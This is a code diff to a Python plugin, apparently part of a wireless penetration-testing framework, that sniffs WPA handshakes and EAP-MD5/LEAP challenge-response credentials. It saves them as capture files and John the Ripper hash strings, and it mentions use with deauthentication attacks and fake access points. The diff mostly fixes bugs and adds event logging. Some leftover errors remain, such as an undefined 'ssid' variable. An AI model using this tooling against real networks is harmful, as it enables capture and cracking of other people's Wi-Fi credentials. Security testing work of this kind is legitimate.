@@ -1,18 +1,20 @@
 # -*- coding: utf-8 -*-
 """
-This class will be a plugin for all Air modules
+This class will be a plugin for all Air modules.
+
 It will sniff the network for WPA 4-way handshakes and EAPoL MD5 and LEAP credentials
 It can be used after a deauthentication attack
 While sniffing or even while running a fake access point to capture hal wpa handshakes
 """
 import os, traceback
+from AuxiliaryModules.packet import Beacon
+from AuxiliaryModules.events import SuccessfulEvent, UnsuccessfulEvent, NeutralEvent
+from SessionManager.sessionmanager import SessionManager
 from pyric import pyw as pyw
 from plugin import AirScannerPlugin, AirHostPlugin, AirInjectorPlugin
-from AuxiliaryModules.packet import Beacon
-from AuxiliaryModules.minwepap import radiotap
 from scapy.packet import *
 from scapy.fields import *
-from scapy.all import Ether, Dot11, Dot11Beacon, EAPOL, EAP, LEAP, PcapWriter, sniff, bind_layers
+from scapy.all import Ether, Dot11Beacon, EAPOL, EAP, LEAP, PcapWriter, sniff, bind_layers
 from scapy.all import eap_types as EAP_TYPES
 from utils.networkmanager import NetworkCard
 from utils.utils import NetUtils
@@ -51,6 +53,8 @@ class CredentialSniffer(AirScannerPlugin, AirHostPlugin, AirInjectorPlugin):
     def __init__(self):
         super(CredentialSniffer, self).__init__("credentialsniffer")
         self.running_interface = self.config["sniffing_interface"]
+        self.running_bssid = self.config["bssid"]
+        self.running_ssid = self.config["ssid"]
         self.log_dir = self.config["log_dir"]
         self.wifi_clients = {}
         self.wpa_handshakes = {}
@@ -252,20 +256,20 @@ class CredentialSniffer(AirScannerPlugin, AirHostPlugin, AirInjectorPlugin):
 
     def _log_half_wpa_handshake(self, client_mac):
         if (self.wpa_handshakes[client_mac]['frame1'] and
-            self.wpa_handshakes[client_mac]['frame2'] and
-            not self.wpa_handshakes[client_mac]['logged']):
+           self.wpa_handshakes[client_mac]['frame2'] and
+           not self.wpa_handshakes[client_mac]['logged']):
 
-            ssid = self._get_ssid_from_mac(self._get_source_from_packet(self.wpa_handshakes[client_mac]['packets'][0]))
-            self.wpa_handshakes[client_mac]['ssid'] = ssid
-
+            self.wpa_handshakes[client_mac]['ssid'] = self.running_ssid
             print "[+] Half WPA Handshake found for client '{}' and network '{}'\n".format( client_mac,
                                                                                             ssid)
             if "wpa_half_handshakes" not in os.listdir(self.log_dir):
-                os.makedir(self.log_dir + "wpa_half_handshakes")
+                os.mkdir(self.log_dir + "wpa_half_handshakes")
 
             log_file_path = self.log_dir + "wpa_half_handshakes/handshake_{}_{}.cap".format(ssid,
                                                                                             client_mac)
             self._log_packets(log_file_path, client_mac)
+            SessionManager().log_event(SuccessfulEvent("Logged Half-WPA Handshake between '{}' and '{}' with SSID '{}'"
+                                                      .format(client_mac, self.running_bssid, self.running_ssid)))
 
     def _log_complete_wpa_handshake(self, client_mac):
         # Get the corresponding beacon packet of the captured handshake
@@ -294,11 +298,16 @@ class CredentialSniffer(AirScannerPlugin, AirHostPlugin, AirInjectorPlugin):
             print "[+] WPA Handshake found for client '{}' and network '{}'\n".format(client_mac,
                                                                                       self.wpa_handshakes[client_mac]['ssid'])
             if "wpa_handshakes" not in os.listdir(self.log_dir):
-                os.makedir(self.log_dir + "wpa_handshakes")
+                os.mkdir(self.log_dir + "wpa_handshakes")
 
             log_file_path = self.log_dir + "wpa_handshakes/handshake_{}_{}.cap".format( self.wpa_handshakes[client_mac]['ssid'],
                                                                                         client_mac)
             self._log_packets(log_file_path, client_mac)
+
+            source_mac = self._get_source_from_packet(self.wpa_handshakes[client_mac]['packets'][0])
+            ssid = self._get_ssid_from_mac(source_mac)
+            SessionManager().log_event(SuccessfulEvent("Logged WPA Handshake between '{}' and '{}' with SSID '{}'"
+                                                      .format(client_mac, source_mac, ssid)))
 
     def _log_packets(self, file_path, client_mac):
         with self.log_lock:
@@ -352,7 +361,7 @@ class CredentialSniffer(AirScannerPlugin, AirHostPlugin, AirInjectorPlugin):
 
             if eap_layer.code == REQUEST:
                 authentication.challenge = eap_layer.load[1:17].encode("HEX")
-            elif packets[EAP].code == RESPONSE:
+            elif packet[EAP].code == RESPONSE:
                 authentication.response = eap_layer.load[1:17].encode("HEX")
 
         elif EAP_TYPES[eap_layer.type] == "LEAP":
@@ -362,14 +371,13 @@ class CredentialSniffer(AirScannerPlugin, AirHostPlugin, AirInjectorPlugin):
                 client.authentications["LEAP"][auth_id] = ChallengeResponseAuth(auth_id, "LEAP")
             authentication = client.authentications["LEAP"][auth_id]
 
-            leap_leayer = packet[LEAP]
-
+            leap_layer = packet[LEAP]
             if leap_layer.name:
                 authentication.username = leap_layer.name
             if eap_layer.code == REQUEST:
                 if len(leap_layer.data) == 8:
                     authentication.challenge = leap_layer.data.encode("HEX")
-            elif packets[EAP].code == RESPONSE:
+            elif packet[EAP].code == RESPONSE:
                 if len(leap_layer.data) == 24:
                     authentication.response = eap_layer.data.encode("HEX")
 
@@ -412,7 +420,7 @@ class ChallengeResponseAuth(object):
     def is_complete(self):
         return not (self.username is None or self.challenge is None or self.response is None)
 
-    def log():
+    def log(self):
         if self.type == "MD5":
             # Save in JTR format
             # username:$1$salt$hash
@@ -429,6 +437,8 @@ class ChallengeResponseAuth(object):
         out = open("eap_hashes{}.log".format(n_log), "a")
         out.write(jtr_hash_string + "\n")
         out.close()
+        SessionManager().log_event(SuccessfulEvent("Got {} hash for username '{}'"
+                                                  .format(self.type, self.username)))
 
     def __eq__(self, other):
         return self.auth_id == other.auth_id
